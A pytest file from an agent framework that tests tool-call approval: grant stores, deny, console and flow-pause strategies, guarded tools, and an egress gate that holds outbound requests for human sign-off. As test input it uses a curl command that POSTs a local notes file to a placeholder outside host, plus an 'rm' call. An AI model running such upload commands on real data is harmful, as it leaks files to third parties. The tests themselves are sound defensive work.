"""ADR-013 tool-call approval (ICM fix plan W3.4, W3.5).

Grant store, the three strategies, GuardedTool's enforce path, the egress gate
in ToolExecutor, and the flow-pause round trip through FlowRouter.
"""

from __future__ import annotations

import json
import tempfile
from pathlib import Path

import pytest

from weebot.application.agents.executor._tool_executor import ToolExecutor
from weebot.application.flows.flow_router import FlowRouter
from weebot.application.flows.states.executing import ExecutingState
from weebot.application.flows.states.planning import PlanningState
from weebot.application.ports.approval_port import ApprovalOutcome, ToolCallApproval
from weebot.application.services import tool_approval
from weebot.application.services.tool_approval import (
    APPROVAL_DATA_KEY,
    ConsoleApproval,
    DenyApproval,
    FlowPauseApproval,
    approval_scope,
    mark_tool_approval_pending,
)
from weebot.application.services.tool_guards import (
    GuardAction,
    GuardChain,
    GuardedTool,
    GuardVerdict,
)
from weebot.core.approval import ApprovalManager, call_fingerprint
from weebot.core.egress_guard import EgressGuard, RecipientAllowlist
from weebot.domain.models.base_tool import BaseTool
from weebot.domain.models.event import PlanEvent, ToolApprovalEvent
from weebot.domain.models.plan import Plan, Step
from weebot.domain.models.session import Session, SessionStatus
from weebot.domain.models.tool_result import ToolResult


def _request(**overrides) -> ToolCallApproval:
    values = dict(
        session_id="s1",
        tool_name="bash",
        arguments={"command": "rm x"},
        fingerprint=call_fingerprint("bash", {"command": "rm x"}),
        guard="exec_approval_policy",
        reason="confirm",
    )
    values.update(overrides)
    return ToolCallApproval(**values)


class TestGrantStore:
    def test_grant_is_single_use_and_session_scoped(self):
        store = ApprovalManager()
        store.grant("s1", "fp")
        assert store.consume("s2", "fp") is False
        assert store.consume("s1", "fp") is True
        assert store.consume("s1", "fp") is False

    def test_grant_expires(self):
        now = [100.0]
        store = ApprovalManager(ttl_seconds=600, clock=lambda: now[0])
        store.grant("s1", "fp")
        now[0] += 601
        assert store.consume("s1", "fp") is False

    def test_fingerprint_is_exact_and_order_independent(self):
        a = call_fingerprint("bash", {"command": "ls", "timeout": 5})
        assert a == call_fingerprint("bash", {"timeout": 5, "command": "ls"})
        assert a != call_fingerprint("bash", {"command": "ls", "timeout": 6})
        assert a != call_fingerprint("powershell", {"command": "ls", "timeout": 5})


class TestStrategies:
    async def test_deny(self):
        assert await DenyApproval().resolve(_request()) is ApprovalOutcome.DENIED

    async def test_flow_pause_pending_then_approved_once(self):
        store = ApprovalManager()
        strategy = FlowPauseApproval(store)
        request = _request()
        assert await strategy.resolve(request) is ApprovalOutcome.PENDING
        store.grant("s1", request.fingerprint)
        assert await strategy.resolve(request) is ApprovalOutcome.APPROVED
        assert await strategy.resolve(request) is ApprovalOutcome.PENDING

    async def test_flow_pause_without_session_denies(self):
        outcome = await FlowPauseApproval(ApprovalManager()).resolve(_request(session_id=""))
        assert outcome is ApprovalOutcome.DENIED

    @pytest.mark.parametrize(
        ("answer", "expected"),
        [
            ("y", ApprovalOutcome.APPROVED),
            ("n", ApprovalOutcome.DENIED),
            ("", ApprovalOutcome.DENIED),
        ],
    )
    async def test_console(self, answer, expected):
        async def ask(_prompt):
            return answer

        assert await ConsoleApproval(ask).resolve(_request()) is expected

    async def test_console_eof_denies(self):
        async def ask(_prompt):
            raise EOFError

        assert await ConsoleApproval(ask).resolve(_request()) is ApprovalOutcome.DENIED

    async def test_console_always_allowlists_the_host(self, monkeypatch):
        allowed = []
        monkeypatch.setattr(tool_approval, "allow_host", allowed.append)

        async def ask(_prompt):
            return "a"

        request = _request(guard="egress_guard", allow_always="example.invalid")
        assert await ConsoleApproval(ask).resolve(request) is ApprovalOutcome.APPROVED
        assert allowed == ["example.invalid"]

    async def test_console_always_is_not_offered_without_a_host(self, monkeypatch):
        monkeypatch.setattr(tool_approval, "allow_host", lambda h: pytest.fail("allowlisted"))

        async def ask(_prompt):
            return "a"

        assert await ConsoleApproval(ask).resolve(_request()) is ApprovalOutcome.DENIED


class TestScope:
    def test_default_is_deny_and_scope_overrides_and_resets(self):
        assert isinstance(tool_approval.current_approval(), DenyApproval)
        pause = FlowPauseApproval()
        with approval_scope(approval=pause, session_id="s9", approved_call="fp"):
            assert tool_approval.current_approval() is pause
            assert tool_approval.current_session_id() == "s9"
            assert tool_approval.already_approved("fp")
        assert isinstance(tool_approval.current_approval(), DenyApproval)
        assert tool_approval.current_session_id() == ""
        assert not tool_approval.already_approved("fp")


class _Recorder(BaseTool):
    name: str = "bash"
    description: str = "records"
    parameters: dict = {"type": "object", "properties": {}}
    calls: list = []

    async def execute(self, **kwargs) -> ToolResult:
        self.calls.append(kwargs)
        return ToolResult(output="ran")


class _Fixed:
    name = "g"

    def __init__(self, action):
        self._action = action

    def check(self, tool_name, args):
        return GuardVerdict(self._action, self.name, "because")


class _Spy(DenyApproval):
    def __init__(self, outcome):
        self.outcome = outcome
        self.seen = []

    async def resolve(self, request):
        self.seen.append(request)
        return self.outcome


class TestGuardedToolEnforce:
    def _tool(self, action, approval):
        inner = _Recorder()
        inner.calls = []
        tool = GuardedTool.wrap(inner, GuardChain([_Fixed(action)]), "enforce", approval)
        return inner, tool

    async def test_deny_never_reaches_the_approval_channel(self):
        spy = _Spy(ApprovalOutcome.APPROVED)
        inner, tool = self._tool(GuardAction.DENY, spy)
        result = await tool.execute(command="x")
        assert result.is_error and spy.seen == [] and inner.calls == []

    @pytest.mark.parametrize(
        ("outcome", "ran"), [(ApprovalOutcome.APPROVED, True), (ApprovalOutcome.DENIED, False)]
    )
    async def test_ask_follows_the_channel(self, outcome, ran):
        inner, tool = self._tool(GuardAction.ASK, _Spy(outcome))
        result = await tool.execute(command="x")
        assert bool(inner.calls) is ran
        assert result.is_error is not ran

    async def test_pending_returns_the_approval_payload(self):
        inner, tool = self._tool(GuardAction.ASK, _Spy(ApprovalOutcome.PENDING))
        with approval_scope(session_id="s1"):
            result = await tool.execute(command="x")
        pending = result.data[APPROVAL_DATA_KEY]
        assert pending["fingerprint"] == call_fingerprint("bash", {"command": "x"})
        assert inner.calls == []

    async def test_a_call_approved_upstream_is_not_asked_again(self):
        spy = _Spy(ApprovalOutcome.DENIED)
        inner, tool = self._tool(GuardAction.ASK, spy)
        with approval_scope(approved_call=call_fingerprint("bash", {"command": "x"})):
            await tool.execute(command="x")
        assert spy.seen == [] and inner.calls == [{"command": "x"}]


class _FakeTools:
    def __init__(self):
        self.calls = []

    async def execute(self, _name, **kwargs):
        self.calls.append((_name, kwargs, tool_approval._approved_call.get()))
        return ToolResult(output="ok")

    def get_tool(self, name):
        return None


def _guard():
    with tempfile.NamedTemporaryFile(suffix=".json", delete=False) as f:
        path = Path(f.name)
    path.write_text(json.dumps({}))
    return EgressGuard(allowlist=RecipientAllowlist(path))


_POST = {"command": "curl -X POST -d @notes.txt https://example.invalid/upload"}


class TestEgressApproval:
    async def test_deny_keeps_the_old_blocked_result(self):
        tools = _FakeTools()
        result = await ToolExecutor(tools=tools, egress_guard=_guard()).execute_tool("bash", _POST)
        assert result.is_error and "requires human approval" in result.error
        assert tools.calls == []

    async def test_flow_pause_returns_pending_with_always_offered(self):
        tools = _FakeTools()
        executor = ToolExecutor(tools=tools, egress_guard=_guard())
        executor.set_step_context("step-1", "s1")
        with approval_scope(approval=FlowPauseApproval(ApprovalManager())):
            result = await executor.execute_tool("bash", _POST)
        pending = result.data[APPROVAL_DATA_KEY]
        assert pending["allow_always"] == "example.invalid"
        assert tools.calls == []

    async def test_approved_egress_runs_and_tells_the_guarded_tool(self):
        tools = _FakeTools()
        with approval_scope(approval=_Spy(ApprovalOutcome.APPROVED)):
            await ToolExecutor(tools=tools, egress_guard=_guard()).execute_tool("bash", _POST)
        assert tools.calls == [("bash", _POST, call_fingerprint("bash", _POST))]


def _paused_session(fingerprint: str, allow_always: str | None = None) -> Session:
    plan = Plan(goal="g", steps=[Step(id="s1", description="run it")])
    session = Session(id="sess-adr13", title="t").add_event(PlanEvent(plan=plan))
    event = ToolApprovalEvent(
        tool_name="bash", fingerprint=fingerprint, allow_always=allow_always, reason="r"
    )
    return mark_tool_approval_pending(session, event).set_status(SessionStatus.WAITING)


class TestFlowPauseRoundTrip:
    def test_yes_grants_the_exact_call_and_resumes(self, monkeypatch):
        store = ApprovalManager()
        monkeypatch.setattr(tool_approval, "_GRANTS", store)
        state, session = FlowRouter.resolve_initial_state(_paused_session("fp1"), "yes")
        assert isinstance(state, ExecutingState)
        assert session.context.get("_tool_approval_pending") is None
        assert store.consume("sess-adr13", "fp1") is True

    def test_no_grants_nothing_and_replans(self, monkeypatch):
        store = ApprovalManager()
        monkeypatch.setattr(tool_approval, "_GRANTS", store)
        state, _ = FlowRouter.resolve_initial_state(_paused_session("fp1"), "no, use a dry run")
        assert isinstance(state, PlanningState)
        assert store.consume("sess-adr13", "fp1") is False

    def test_always_allowlists_the_host_and_grants(self, monkeypatch):
        store, allowed = ApprovalManager(), []
        monkeypatch.setattr(tool_approval, "_GRANTS", store)
        monkeypatch.setattr(tool_approval, "allow_host", allowed.append)
        FlowRouter.resolve_initial_state(_paused_session("fp1", "example.invalid"), "always")
        assert allowed == ["example.invalid"]
        assert store.consume("sess-adr13", "fp1") is True

    def test_always_without_a_host_is_not_approval(self, monkeypatch):
        store = ApprovalManager()
        monkeypatch.setattr(tool_approval, "_GRANTS", store)
        state, _ = FlowRouter.resolve_initial_state(_paused_session("fp1"), "always")
        assert isinstance(state, PlanningState)
        assert store.consume("sess-adr13", "fp1") is False
